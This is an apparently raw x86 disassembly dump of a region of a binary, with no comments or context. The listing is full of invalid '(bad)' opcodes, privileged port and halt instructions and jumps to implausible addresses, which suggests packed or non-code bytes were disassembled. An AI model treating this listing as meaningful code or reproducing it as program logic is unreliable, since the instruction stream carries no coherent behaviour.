  41c87f:	and    ah,bh
  41c881:	pop    ds
  41c882:	rcr    bl,0xf8
  41c885:	inc    ebp
  41c886:	push   edi
  41c887:	popf   
  41c888:	or     esp,DWORD PTR [edi-0x3a]
  41c88b:	jp     0x41c89c
  41c88d:	jp     0x41c844
  41c88f:	add    BYTE PTR [eax],0x0
	...
  41c8f2:	add    BYTE PTR [eax],al
  41c8f4:	arpl   WORD PTR [ebp*4-0x44200cc],si
  41c8fb:	ja     0x41c915
  41c8fd:	sub    DWORD PTR [ebx],edi
  41c8ff:	add    DWORD PTR [ecx+edi*4+0x19],esi
  41c903:	sub    DWORD PTR [edi+ebp*1+0x1],ecx
  41c907:	add    BYTE PTR [ecx+eax*1],al
  41c90a:	add    BYTE PTR [eax],al
  41c90c:	stos   DWORD PTR es:[edi],eax
  41c90d:	and    DWORD PTR [eax+0x5d],edx
  41c910:	(bad)  
  41c911:	cli    
  41c912:	sbb    bl,BYTE PTR [edx]
  41c914:	les    ecx,FWORD PTR [ecx+ebx*8]
  41c917:	icebp  
  41c918:	bound  ebp,QWORD PTR [ecx]
  41c91a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c91b:	xchg   BYTE PTR [ebx-0x33],dh
  41c91e:	jg     0x41c921
  41c920:	mov    bl,0xc1
  41c922:	jno    0x41c99f
  41c924:	pop    eax
  41c925:	push   0xffffff81
  41c927:	cmp    DWORD PTR [ecx-0x7d],esp
  41c92a:	sahf   
  41c92b:	sub    eax,0x2dcf0ac
  41c930:	xor    eax,0x839220fc
  41c935:	retf   
  41c936:	pop    ds
  41c937:	xchg   DWORD PTR [ebx],esp
  41c939:	add    ebx,DWORD PTR [ecx]
  41c93b:	jnp    0x41c8f1
  41c93d:	xchg   ebp,eax
  41c93e:	jmp    0x41c988
  41c940:	jge    0x41c8f7
  41c942:	fdivr  QWORD PTR [ecx]
  41c944:	leave  
  41c945:	xchg   ecx,eax
  41c946:	xor    ebx,ecx
  41c948:	pop    ebp
  41c949:	rcl    BYTE PTR [ebp-0x7f],1
  41c94c:	gs inc ecx
  41c94e:	push   eax
  41c94f:	fisub  DWORD PTR [edx]
  41c951:	pop    esp
  41c952:	and    eax,0xe9235394
  41c957:	mov    ah,0xfb
  41c959:	jae    0x41c90c
  41c95b:	mov    al,BYTE PTR [eax-0x606dfce]
  41c961:	enter  0xfb84,0x22
  41c965:	ror    DWORD PTR [edi+eiz*1-0x78],0xfe
  41c96a:	mov    cl,0x51
  41c96c:	jecxz  0x41c9dc
  41c96e:	repz pop edi
  41c970:	cmc    
  41c971:	lds    esi,FWORD PTR [edi-0x15]
  41c974:	dec    ecx
  41c975:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c976:	mov    ds:0x8945576,al
  41c97b:	jl     0x41c9a0
  41c97d:	in     eax,0x52
  41c97f:	sti    
  41c980:	mov    eax,ds:0x86aa364d
  41c985:	out    dx,al
  41c986:	les    esi,FWORD PTR [ebp-0x40]
  41c989:	ficom  WORD PTR [ebx-0x35]
  41c98c:	fcom   QWORD PTR [ecx]
  41c98e:	sti    
  41c98f:	jbe    0x41c942
  41c991:	mov    BYTE PTR ss:[edx],ah
  41c994:	xor    BYTE PTR [eax],al
  41c996:	jae    0x41c9a6
  41c998:	mov    bh,0xa4
  41c99a:	scas   al,BYTE PTR es:[edi]
  41c99b:	repnz mov ds,WORD PTR [edi]
  41c99e:	hlt    
  41c99f:	dec    edi
  41c9a0:	jb     0x41c97f
  41c9a2:	jb     0x41c9cc
  41c9a4:	fwait
  41c9a5:	and    BYTE PTR [eax],bl
  41c9a7:	xchg   ebx,eax
  41c9a8:	mov    es,WORD PTR [edi-0x20317407]
  41c9ae:	jae    0x41c991
  41c9b0:	dec    esi
  41c9b1:	and    ch,BYTE PTR [edx-0x5a]
  41c9b4:	jp     0x41c9c9
  41c9b6:	aaa    
  41c9b7:	cmp    ecx,DWORD PTR [esi+0x13]
  41c9ba:	cmc    
  41c9bb:	arpl   di,bx
  41c9bd:	adc    eax,0xcb2b848d
  41c9c2:	push   eax
  41c9c3:	adc    eax,0x5e57e3be
  41c9c8:	jns    0x41c9e7
  41c9ca:	aas    
  41c9cb:	add    eax,0xd35ccfef
  41c9d0:	add    ch,dl
  41c9d2:	mov    edx,DWORD PTR [ecx-0x2cf64e84]
  41c9d8:	add    ebx,edx
  41c9da:	aam    0x12
  41c9dc:	iret   
  41c9dd:	call   DWORD PTR [esi-0x11]
  41c9e0:	xor    al,al
  41c9e2:	dec    esi
  41c9e3:	pushf  
  41c9e4:	or     ah,0x1d
  41c9e7:	mov    edi,0xd419e6d1
  41c9ec:	jg     0x41ca2c
  41c9ee:	sbb    BYTE PTR [ecx-0x79],al
  41c9f1:	sbb    DWORD PTR [ecx],ebx
  41c9f3:	loop   0x41c9bf
  41c9f5:	mov    ch,BYTE PTR [edx+0x6425882a]
  41c9fb:	lea    eax,[ebx+0x71e94ebb]
  41ca01:	or     BYTE PTR [ebx],0x2d
  41ca04:	jae    0x41ca01
  41ca06:	into   
  41ca07:	inc    eax
  41ca08:	push   0xdb76a2de
  41ca0d:	cmp    ebx,DWORD PTR [edi-0x6e]
	...
  41ca74:	lock retf 0xfc94
  41ca78:	mov    esi,0xc1cef8fe
  41ca7d:	or     al,BYTE PTR [ebx+0x0]
  41ca80:	sahf   
  41ca81:	push   ss
  41ca82:	mov    DWORD PTR [esi+0x13050],edx
  41ca88:	add    al,0x1
  41ca8a:	add    BYTE PTR [eax],al
  41ca8c:	xor    DWORD PTR [eax+0x2b],ebp
  41ca8f:	data16 je 0x41caf6
  41ca92:	or     eax,0x86479e90
  41ca97:	sbb    BYTE PTR [ebx+0x5b747a5c],al
  41ca9d:	fucomi st,st(1)
  41ca9f:	jg     0x41cabc
  41caa1:	pop    edi
  41caa2:	fisubr WORD PTR [edx+edi*8]
  41caa5:	xor    ah,ah
  41caa7:	mov    dl,0x25
  41caa9:	sub    al,0xc0
  41caab:	jmp    0x2c6e:0xdf6c6a54
  41cab2:	out    0xea,al
  41cab4:	add    esi,ebp
  41cab6:	test   eax,0xc075a7af
  41cabb:	test   al,0x39
  41cabd:	adc    eax,0x13041e92
  41cac2:	pop    ebx
  41cac3:	daa    
  41cac4:	fwait
  41cac5:	lods   al,BYTE PTR ds:[esi]
  41cac6:	mov    bh,0xd3
  41cac8:	fadd   st,st(1)
  41caca:	ret    
  41cacb:	das    
  41cacc:	hlt    
  41cacd:	mov    bl,0x69
  41cacf:	int3   
  41cad0:	pushf  
  41cad1:	lea    eax,[eax+ebx*4]
  41cad4:	mov    esp,0xd12a95b8
  41cad9:	ret    
  41cada:	cmc    
  41cadb:	mov    esi,0x7c42e2b5
  41cae1:	inc    esp
  41cae2:	sbb    al,0x97
  41cae4:	(bad)  
  41cae5:	pushf  
  41cae6:	aaa    
  41cae7:	dec    ecx
  41cae8:	cmp    eax,esp
  41caea:	xchg   ecx,eax
  41caeb:	sbb    eax,0xb57362fc
  41caf0:	xchg   ebx,eax
  41caf1:	adc    ch,dh
  41caf3:	lahf   
  41caf4:	sub    al,0xca
  41caf6:	shl    BYTE PTR [ebx],1
  41caf8:	mov    cl,0x9f
  41cafa:	sbb    al,BYTE PTR [ecx]
  41cafc:	push   edi
  41cafd:	fist   DWORD PTR [eax+ebx*8+0x4dcd18fb]
  41cb04:	xor    eax,0x4f40cdd2
  41cb09:	sub    eax,0x56010f75
  41cb0e:	in     eax,0xe0
  41cb10:	inc    eax
  41cb11:	fsubr  QWORD PTR [edi-0x11]
  41cb14:	adc    eax,0x83259766
  41cb19:	push   esi
  41cb1a:	mov    bh,0x44
  41cb1c:	inc    eax
  41cb1d:	jo     0x41cb1f
  41cb1f:	scas   eax,DWORD PTR es:[edi]
  41cb20:	xchg   esi,eax
  41cb21:	adc    eax,0x9c12cac5
  41cb26:	repz mov cl,BYTE PTR [edi+0x7c]
  41cb2a:	adc    DWORD PTR [eax-0x65da4796],ebx
  41cb30:	dec    ebp
  41cb31:	loop   0x41cac0
  41cb33:	push   es
  41cb34:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41cb35:	and    bh,BYTE PTR [ebx]
  41cb37:	pop    esp
  41cb38:	pop    ebp
  41cb39:	push   ebx
  41cb3a:	ins    DWORD PTR es:[edi],dx
  41cb3b:	aam    0xf8
  41cb3d:	daa    
  41cb3e:	jle    0x41cad7
  41cb40:	scas   al,BYTE PTR es:[edi]
  41cb41:	cdq    
  41cb42:	bound  eax,QWORD PTR [ecx]
  41cb44:	call   0x403a57cf
  41cb49:	push   ss
  41cb4a:	das    
  41cb4b:	inc    ebx
  41cb4c:	mov    ch,0x38
  41cb4e:	sub    al,0x77
  41cb50:	push   ds
  41cb51:	call   0x8710a6b0
  41cb56:	nop
  41cb57:	in     eax,0x9d
  41cb59:	out    0xbd,al
  41cb5b:	mul    DWORD PTR [ecx+0x40]
  41cb5e:	push   ebx
  41cb5f:	jmp    0x41cb71
  41cb61:	scas   eax,DWORD PTR es:[edi]
  41cb62:	xor    al,0xa
  41cb64:	das    
  41cb65:	das    
  41cb66:	xor    al,0xd9
  41cb68:	mov    ds:0xf2e35395,eax
  41cb6d:	dec    ebp
  41cb6e:	push   ebx
  41cb6f:	pop    esi
  41cb70:	sbb    bh,bh
  41cb72:	(bad)  
  41cb73:	fimul  DWORD PTR [edx+0x1b]
  41cb76:	mov    edi,0x2da6b358
  41cb7b:	sbb    bl,BYTE PTR [edi+0x49]
  41cb7e:	xchg   edi,eax
  41cb7f:	scas   eax,DWORD PTR es:[edi]
  41cb80:	dec    edx
  41cb81:	das    
  41cb82:	out    dx,al
  41cb83:	ret    
  41cb84:	(bad)  
  41cb85:	sar    BYTE PTR [eax-0x19],0xb
  41cb89:	pusha  
  41cb8a:	pop    ds
  41cb8b:	loop   0x41cba8
  41cb8d:	dec    edi
  41cb8e:	int    0xbf
	...
  41cbf4:	sub    esi,edx
  41cbf6:	sti    
  41cbf7:	pop    ebp
  41cbf8:	(bad)  
  41cbf9:	jge    0x41cbaa
  41cbfb:	neg    cl
  41cbfd:	hlt    
  41cbfe:	add    eax,0x40054122
  41cc03:	fist   WORD PTR [ecx+esi*1+0x1]
  41cc07:	add    BYTE PTR [ecx+eax*1],al
  41cc0a:	add    BYTE PTR [eax],al
  41cc0c:	test   DWORD PTR [eax-0xd5b3f31],eax
  41cc12:	jb     0x41cbff
  41cc14:	leave  
  41cc15:	mov    eax,ds:0x8370a45
  41cc1a:	cdq    
  41cc1b:	jbe    0x41cbff
  41cc1d:	and    bh,BYTE PTR [ecx-0x45]
  41cc20:	push   esi
  41cc21:	pop    esp
  41cc22:	imul   edi,esp,0xffffffba
  41cc25:	in     eax,dx
  41cc26:	push   ss
  41cc27:	jl     0x41cbaa
  41cc29:	fistp  DWORD PTR [ebp+0x2b0df613]
  41cc2f:	bnd jge 0x41cbd8
  41cc32:	retf   
  41cc33:	dec    esp
  41cc34:	das    
  41cc35:	xor    DWORD PTR ds:[eax+0x79c394e4],esp
  41cc3c:	pop    eax
  41cc3d:	or     BYTE PTR [edx],bl
  41cc3f:	jp     0x41cc75
  41cc41:	jno    0x41cc6d
  41cc43:	jge    0x41cc38
  41cc45:	dec    ebp
  41cc46:	sbb    eax,0xc591591f
  41cc4b:	mov    cl,0x8d
  41cc4d:	(bad)  
  41cc4f:	push   0xd734579d
  41cc54:	pop    edx
  41cc55:	mov    esp,DWORD PTR [esi-0x151d0f5]
  41cc5b:	sbb    al,0x6a
  41cc5d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41cc5e:	and    eax,0xd5456280
  41cc63:	mov    ss,WORD PTR [ebx-0x207bac79]
  41cc69:	loop   0x41cc86
  41cc6b:	dec    edx
  41cc6c:	or     al,0x73
  41cc6e:	jno    0x41ccb2
  41cc70:	and    edx,DWORD PTR [esi]
  41cc72:	jb     0x41cc11
  41cc74:	lods   eax,DWORD PTR ds:[esi]
  41cc75:	fwait
  41cc76:	push   edi
  41cc77:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41cc78:	inc    ebp
  41cc79:	push   0x6
  41cc7b:	das    
  41cc7c:	cs xchg edx,eax
  41cc7e:	xchg   DWORD PTR [esi+0x6f98ee44],eax
  41cc84:	mov    ch,0xd7
  41cc86:	std    
  41cc87:	adc    al,BYTE PTR cs:[ebx+edx*8]
  41cc8b:	das    
  41cc8c:	and    al,BYTE PTR [ecx+0x1a]
  41cc8f:	sti    
  41cc90:	cmp    BYTE PTR [edi-0x55],bh
  41cc93:	and    al,0x83
  41cc95:	adc    al,0x9e
  41cc97:	adc    esi,DWORD PTR [eax]
  41cc99:	dec    eax
  41cc9a:	mov    bl,0x0
  41cc9c:	jg     0x41cc6b
  41cc9e:	ja     0x41cca3
  41cca0:	sbb    DWORD PTR [edx],esp
  41cca2:	adc    edx,ebx
  41cca4:	mov    bh,0x9c
  41cca6:	(bad)  
  41cca7:	cli    
  41cca8:	test   BYTE PTR [ebx-0x71],al
  41ccab:	jmp    0x67dc:0xec2a153f
  41ccb2:	repz or al,BYTE PTR [edi]
  41ccb5:	adc    edx,edi
  41ccb7:	fnsave [edx]
  41ccb9:	daa    
  41ccba:	adc    eax,0xd07a3fe2
  41ccbf:	pop    ds
  41ccc0:	dec    ebx
  41ccc1:	shr    DWORD PTR [edi],0xe
  41ccc4:	cmp    bh,0x44
  41ccc7:	sub    ecx,ebp
  41ccc9:	sub    al,0xf2
  41cccb:	pop    esp
  41cccc:	adc    BYTE PTR [eax],bh
  41ccce:	mov    ebp,0x6370359f
  41ccd3:	into   
  41ccd4:	dec    eax
  41ccd5:	xchg   ch,ch
  41ccd7:	repz mov esi,DWORD PTR [edi+0x2e24695]
  41ccde:	mov    dh,0x50
  41cce0:	in     eax,0x14
  41cce2:	nop
  41cce3:	inc    ebx
  41cce4:	ret    
  41cce5:	push   ss
  41cce6:	fucomi st,st(7)
  41cce8:	adc    ebx,ecx
  41ccea:	inc    ebx
  41cceb:	push   0xe3bff7d9
  41ccf0:	out    0xa0,al
  41ccf2:	jbe    0x41cd41
  41ccf4:	js     0x41cd6d
  41ccf6:	sub    al,0x2
  41ccf8:	push   esp
  41ccf9:	out    0x28,al
  41ccfb:	arpl   dx,ax
  41ccfd:	push   esi
  41ccfe:	sub    ebx,ecx
  41cd00:	(bad)  
  41cd01:	test   BYTE PTR [edx+0x60539c98],0x9a
  41cd08:	(bad)  
  41cd09:	push   ebx
  41cd0a:	call   0xb859f0d3
  41cd0f:	or     BYTE PTR [eax],al
	...
  41cd71:	add    BYTE PTR [eax],al
  41cd73:	add    BYTE PTR [eax-0x67],ah
  41cd76:	fsubr  st(5),st
  41cd78:	std    
  41cd79:	in     eax,0x79
  41cd7b:	popf   
  41cd7c:	in     al,dx
  41cd7d:	stc    
  41cd7e:	jmp    0x41cdb0
  41cd80:	dec    edx
  41cd81:	imul   esi,DWORD PTR [esi-0x61],0x58
  41cd85:	xor    al,BYTE PTR [ecx]
  41cd87:	add    BYTE PTR [ecx+eax*1],al
  41cd8a:	add    BYTE PTR [eax],al
  41cd8c:	adc    eax,0x6b5f68a2
  41cd91:	hlt    
  41cd92:	jne    0x41cd4d
  41cd94:	cld    
  41cd95:	jp     0x41cdc8
  41cd97:	(bad)  
  41cd99:	lods   eax,DWORD PTR ds:[esi]
  41cd9a:	(bad)  
  41cd9b:	in     al,dx
  41cd9c:	cwde   
  41cd9d:	ficomp WORD PTR [esi+0xf]
  41cda0:	nop
  41cda1:	into   
  41cda2:	mov    bl,0xe3
  41cda4:	and    BYTE PTR [ebx],dh
  41cda6:	std    
  41cda7:	lods   eax,DWORD PTR ds:[esi]
  41cda8:	xchg   esi,eax
  41cda9:	arpl   WORD PTR [edi+0x34],si
  41cdac:	test   DWORD PTR [ebx+0x76546c4e],ebx
  41cdb2:	hlt    
  41cdb3:	or     DWORD PTR [ecx+ebp*1-0x50547380],esp
  41cdba:	cmp    al,0x83
  41cdbc:	loop   0x41cdd2
  41cdbe:	mov    esi,0xfeb21fcc
  41cdc3:	mov    ch,0xe5
  41cdc5:	or     eax,0xd39c9da8
  41cdca:	add    ebx,eax
  41cdcc:	repz xor dl,bh
  41cdcf:	mov    cl,0x4b
  41cdd1:	sahf   
  41cdd2:	push   esp
  41cdd3:	jns    0x41cdcf
  41cdd5:	pusha  
  41cdd6:	hlt    
  41cdd7:	test   al,al
  41cdd9:	neg    BYTE PTR [edx-0x77]
  41cddc:	sbb    dh,BYTE PTR [edi-0x65]
  41cddf:	push   ds
  41cde0:	xor    BYTE PTR [esi],0x59
  41cde3:	sbb    dh,ch
  41cde5:	ror    DWORD PTR [ecx+0x51891f8d],1
  41cdeb:	bound  edx,QWORD PTR ds:0x91b9f2c1
  41cdf1:	addr16 pop esp
  41cdf3:	jb     0x41ce4f
  41cdf5:	xor    DWORD PTR [ebp+0x47160581],edx
  41cdfb:	sbb    eax,DWORD PTR [ebx]
  41cdfd:	jns    0x41cdc4
  41cdff:	pushf  
  41ce00:	mov    esp,0xabc06ee5
  41ce05:	loop   0x41ce33
  41ce07:	mov    BYTE PTR [ecx],cl
  41ce09:	jle    0x41ce6f
  41ce0b:	xor    al,0x61
  41ce0d:	bnd jl 0x41cdcc
  41ce10:	stos   BYTE PTR es:[edi],al
  41ce11:	int    0xa5
  41ce13:	shr    ecx,1
  41ce15:	retf   0xea43
  41ce18:	test   BYTE PTR [eax-0x39],cl
  41ce1b:	out    dx,al
  41ce1c:	hlt    
  41ce1d:	or     al,0x33
  41ce1f:	dec    eax
  41ce20:	repnz push edi
  41ce22:	sub    DWORD PTR [edx+0x2fe461dd],0x5ea71a7b
  41ce2c:	inc    ebp
  41ce2d:	pop    ebx
  41ce2e:	lahf   
  41ce2f:	sub    ecx,DWORD PTR [eax+ebp*4]
  41ce32:	xor    BYTE PTR [ebx],al
  41ce34:	mov    cl,0xd0
  41ce36:	push   0x7b
  41ce38:	jae    0x41cde5
  41ce3a:	pop    ds
  41ce3b:	pop    esp
  41ce3c:	pop    ebp
  41ce3d:	outs   dx,DWORD PTR ds:[esi]
  41ce3e:	pop    eax
  41ce3f:	inc    ebp
  41ce40:	scas   al,BYTE PTR es:[edi]
  41ce41:	(bad)  
  41ce42:	cli    
  41ce43:	inc    ebp
  41ce44:	fsubr  DWORD PTR [ecx+0x5a]
  41ce47:	pop    edi
  41ce48:	mov    dl,0x8c
  41ce4a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ce4b:	push   edi
  41ce4c:	outs   dx,DWORD PTR ds:[esi]
  41ce4d:	(bad)  
  41ce4f:	cs xor eax,0x9e0ee9c6
  41ce55:	push   ebx
  41ce56:	jmp    0x41cec8
  41ce58:	dec    ecx
  41ce59:	ss pop edi
  41ce5b:	ja     0x41ceb7
  41ce5d:	or     al,0x26
  41ce5f:	jmp    0xbf4e:0x5347aa6c
  41ce66:	(bad)  
  41ce68:	push   cs
  41ce69:	and    eax,0x7d000605
  41ce6e:	gs outs dx,DWORD PTR es:[esi]
  41ce71:	mov    al,ds:0xa886bc53
  41ce76:	sbb    eax,0x1cd52c6a
  41ce7b:	repnz or ch,0xc6
  41ce7f:	push   ss
  41ce80:	dec    ebx
  41ce81:	arpl   WORD PTR [edx-0x64],sp
  41ce84:	xor    DWORD PTR [ecx-0x466bd2ef],esi
  41ce8a:	stos   BYTE PTR es:[edi],al
  41ce8b:	lods   eax,DWORD PTR ds:[esi]
  41ce8c:	sub    al,0xf1
  41ce8e:	sti    
  41ce8f:	stos   DWORD PTR es:[edi],eax
	...
  41cef4:	pop    es
  41cef5:	jp     0x41cedf
  41cef7:	jnp    0x41cef6
  41cef9:	sti    
  41cefa:	xchg   edi,eax
  41cefb:	jle    0x41cf44
  41cefd:	jp     0x41ced9
  41ceff:	lods   al,BYTE PTR ds:[esi]
  41cf00:	sub    eax,0x5c029e08
  41cf05:	xor    eax,DWORD PTR [ecx]
  41cf07:	add    BYTE PTR [ecx+eax*1],al
  41cf0a:	add    BYTE PTR [eax],al
  41cf0c:	adc    al,BYTE PTR [ebp+0x2fc79893]
  41cf12:	mov    dh,0x21
  41cf14:	adc    ebx,DWORD PTR [ecx+0x2a]
  41cf17:	mov    esp,0xfd39c186
  41cf1c:	js     0x41ceb2
  41cf1e:	mov    dl,0x11
  41cf20:	mov    eax,ds:0x6e37fd25
  41cf25:	dec    esi
  41cf26:	sub    al,0x6
  41cf28:	out    dx,al
  41cf29:	cs push ebp
  41cf2b:	fadd   DWORD PTR [ecx+0x7b707b5]
  41cf31:	test   DWORD PTR [eax+0x1a],esp
  41cf34:	or     BYTE PTR [edx-0x63b7a36d],ah
  41cf3a:	jecxz  0x41cece
  41cf3c:	adc    DWORD PTR [edi-0x20],0x65c78182
  41cf43:	pusha  
  41cf44:	inc    ebx
  41cf45:	jbe    0x41cf56
  41cf47:	rcl    BYTE PTR [ebp+0x58b2d180],cl
  41cf4d:	out    dx,al
  41cf4e:	push   ecx
  41cf4f:	ror    DWORD PTR [esi-0x498d24],0x5a
  41cf56:	rcl    DWORD PTR [ecx+0x1c8b28cc],cl
  41cf5c:	pop    ecx
  41cf5d:	mov    edx,edx
  41cf5f:	scas   eax,DWORD PTR es:[edi]
  41cf60:	mov    eax,DWORD PTR [edx-0x20e1315a]
  41cf66:	ja     0x41cf00
  41cf68:	jmp    0xc83f7d8f
  41cf6d:	imul   edx,DWORD PTR cs:[eax+0x2],0xffffff88
  41cf72:	fninit 
  41cf74:	mov    ds:0x37a8f32,al
  41cf79:	(bad)  
  41cf7a:	pop    ebx
  41cf7b:	loop   0x41cfc5
  41cf7d:	inc    esi
  41cf7e:	fwait
  41cf7f:	xchg   BYTE PTR [edi],bl
  41cf81:	mov    al,0x57
  41cf83:	mov    dh,0xc2
  41cf85:	sub    BYTE PTR [edx+0x6e],al
  41cf88:	popf   
  41cf89:	popa   
  41cf8a:	repz icebp 
  41cf8c:	jecxz  0x41cfdc
  41cf8e:	(bad)  
  41cf8f:	in     eax,dx
  41cf90:	lock pop ds
  41cf92:	inc    esi
  41cf93:	lea    edx,[ecx-0x3a]
  41cf96:	mov    ebp,0xe2199a3c
  41cf9b:	bound  esp,QWORD PTR [edi+edi*4-0x43]
  41cf9f:	mov    ?,WORD PTR [edi+0x3c0c76bc]
  41cfa5:	inc    ebx
  41cfa6:	inc    esp
  41cfa7:	pop    ss
  41cfa8:	push   ebp
  41cfa9:	shr    BYTE PTR [edx-0xa05c2a1],1
  41cfaf:	and    esp,DWORD PTR [edi-0x741b7c20]
  41cfb5:	mov    edi,0xe2e99825
  41cfba:	push   0x69
  41cfbc:	retf   
  41cfbd:	lahf   
  41cfbe:	(bad)  
  41cfbf:	push   edi
  41cfc0:	cwde   
  41cfc1:	imul   edx,DWORD PTR [ebx+0x6483423e],0xffffffa7
  41cfc8:	jmp    0x41cf4c
  41cfca:	jo     0x41cf71
  41cfcc:	jp     0x41cf83
  41cfce:	or     BYTE PTR [ebp+0x40],ah
  41cfd1:	jmp    0x1eb8d0d1
  41cfd6:	mov    ch,0x5f
  41cfd8:	push   0x6c
  41cfda:	push   es
  41cfdb:	push   esi
  41cfdc:	and    edx,edi
  41cfde:	push   cs
  41cfdf:	stc    
  41cfe0:	inc    eax
  41cfe1:	outs   dx,BYTE PTR ds:[esi]
  41cfe2:	push   cs
  41cfe3:	(bad)  
  41cfe5:	jmp    0x41d03b
  41cfe7:	and    dh,bl
  41cfe9:	popa   
  41cfea:	scas   eax,DWORD PTR es:[edi]
  41cfeb:	or     al,0xaa
  41cfed:	shl    eax,1
  41cfef:	inc    ecx
  41cff0:	out    0xaf,eax
  41cff2:	xor    edx,DWORD PTR [esi-0x60]
  41cff5:	mov    al,ds:0xe7608c7a
  41cffa:	dec    ecx
  41cffb:	pop    ebp
  41cffc:	fwait
  41cffd:	xor    al,0xac
  41cfff:	lock sub edx,DWORD PTR [ebx]
  41d002:	cwde   
  41d003:	(bad)  
  41d005:	shr    edx,1
  41d007:	sahf   
  41d008:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d009:	mov    gs,ebp
  41d00b:	fstp   TBYTE PTR [ecx]
  41d00d:	and    BYTE PTR [ebx+0x39],cl
	...
  41d074:	mov    ecx,0xad432034
  41d079:	push   edi
  41d07a:	sti    
  41d07b:	dec    BYTE PTR [esi-0x1b]
  41d07e:	mov    ebp,0x90c9c6bd
  41d083:	adc    eax,0x13460
  41d088:	add    al,0x1
  41d08a:	add    BYTE PTR [eax],al
  41d08c:	xchg   dh,dh
  41d08e:	sub    al,0x2e
  41d090:	cld    
  41d091:	lods   eax,DWORD PTR ds:[esi]
  41d092:	out    dx,eax
  41d093:	call   DWORD PTR [ebx-0x48]
  41d096:	inc    ebp
  41d097:	push   ebp
  41d098:	xchg   esi,eax
  41d099:	mov    bl,0x3e
  41d09b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d09c:	jns    0x41d03c
  41d09e:	and    cl,cl
  41d0a0:	push   esp
  41d0a1:	xchg   ebx,eax
  41d0a2:	addr16 ja 0x41d028
  41d0a5:	push   0x23
  41d0a7:	or     bl,al
  41d0a9:	icebp  
  41d0aa:	stos   BYTE PTR es:[edi],al
  41d0ab:	and    al,0x50
  41d0ad:	mov    ch,0x3b
  41d0af:	(bad)  
  41d0b0:	pop    edi
  41d0b1:	xor    edx,0x1cf26b1e
  41d0b7:	sbb    eax,0x6541f10e
  41d0bc:	sub    al,0x9
  41d0be:	and    bh,cl
  41d0c0:	mov    BYTE PTR [ecx-0xf],ch
  41d0c3:	push   edx
  41d0c4:	inc    ebp
  41d0c5:	mov    al,0x3c
  41d0c7:	pop    esp
  41d0c8:	push   ebx
  41d0c9:	xchg   ebp,eax
  41d0ca:	daa    
  41d0cb:	jecxz  0x41d09f
  41d0cd:	adc    BYTE PTR [ebp+0x37],cl
  41d0d0:	pop    ebp
  41d0d1:	and    DWORD PTR [edi+0x52c7dd57],esi
  41d0d7:	pop    edi
  41d0d8:	ds and bl,ch
  41d0db:	pop    edx
  41d0dc:	jmp    0x18855ca1
  41d0e1:	add    esi,eax
  41d0e3:	inc    edi
  41d0e4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d0e5:	fwait
  41d0e6:	ja     0x41d084
  41d0e8:	fstp   DWORD PTR [edx+ebp*4+0x52caaee6]
  41d0ef:	xlat   BYTE PTR ds:[ebx]
  41d0f0:	and    eax,0xbe29ee19
  41d0f5:	mov    edi,0xae0ddbe6
  41d0fa:	mov    bl,0x66
  41d0fc:	repnz xchg ecx,eax
  41d0fe:	and    DWORD PTR [eax+eiz*8-0x7],edi
  41d102:	stos   DWORD PTR es:[edi],eax
  41d103:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d104:	sbb    DWORD PTR [ecx-0x505db38f],edx
  41d10a:	lahf   
  41d10b:	int3   
  41d10c:	pop    eax
  41d10d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d10e:	js     0x41d16f
  41d110:	bound  ebp,QWORD PTR [esi]
  41d112:	push   ds
  41d113:	(bad)  
  41d114:	mov    bh,0xbe
  41d116:	fwait
  41d117:	lea    esp,[ecx]
  41d119:	out    dx,eax
  41d11a:	inc    edx
  41d11b:	test   BYTE PTR [edi+0x16],dl
  41d11e:	dec    ebx
  41d11f:	adc    BYTE PTR [ebx-0x3],0x7c
  41d123:	unpcklps xmm4,XMMWORD PTR [esi-0x4021d6e2]
  41d12a:	jb     0x41d188
  41d12c:	aaa    
  41d12d:	jge    0x41d12f
  41d12f:	sub    bl,BYTE PTR ds:0x93536b3
  41d135:	int    0x16
  41d137:	mov    ch,0x8e
  41d139:	aaa    
  41d13a:	ret    0x6f5e
  41d13d:	fdivp  st(3),st
  41d13f:	push   ecx
  41d140:	add    al,0x32
  41d142:	aad    0x22
  41d144:	dec    ebx
  41d145:	(bad)  
  41d146:	lock xchg ebx,eax
  41d148:	sbb    BYTE PTR [ecx-0x63c93ed5],bl
  41d14e:	xchg   ebx,eax
  41d14f:	cmp    esi,DWORD PTR [esi+0x25c7b7cc]
  41d155:	xchg   ebp,esp
  41d157:	adc    BYTE PTR [edi+0x7b],ah
  41d15a:	or     esi,DWORD PTR [esi-0x10571c37]
  41d160:	inc    ecx
  41d161:	dec    ebx
  41d162:	mov    al,ds:0xe42872bf
  41d167:	or     ebp,DWORD PTR [edi-0x289ced7d]
  41d16d:	retf   0xeab2
  41d170:	inc    esp
  41d172:	(bad)  
  41d173:	xchg   ebp,eax
  41d174:	pop    es
  41d175:	jae    0x41d178
  41d177:	in     eax,0xa
  41d179:	popa   
  41d17a:	cs xchg esi,eax
  41d17c:	addr16 into 
  41d17e:	and    edx,DWORD PTR [edx-0x32]
  41d181:	ror    ebx,cl
  41d183:	enter  0x4035,0x7f
  41d187:	jg     0x41d1e5
  41d189:	rol    BYTE PTR [ebx+esi*1],0xe5
  41d18d:	adc    DWORD PTR [eax],0xffffffdc
	...
  41d1f4:	push   eax
  41d1f5:	ret    
  41d1f6:	cmp    ecx,DWORD PTR ds:0xdf76fdbb
  41d1fc:	xor    DWORD PTR [ebp-0x7],esp
  41d1ff:	hlt    
  41d200:	nop
  41d201:	adc    ah,BYTE PTR [edi]
  41d203:	add    BYTE PTR [ebp+esi*1+0x1],ah
  41d207:	add    BYTE PTR [ecx+eax*1],al
  41d20a:	add    BYTE PTR [eax],al
  41d20c:	pop    esi
  41d20d:	call   0x911d:0x4f58dd73
  41d214:	int3   
  41d215:	shl    edi,cl
  41d217:	dec    esi
  41d218:	sbb    edx,DWORD PTR [ebx]
  41d21a:	push   eax
  41d21b:	push   ebx
  41d21c:	jae    0x41d297
  41d21e:	iret   
  41d21f:	jne    0x41d1eb
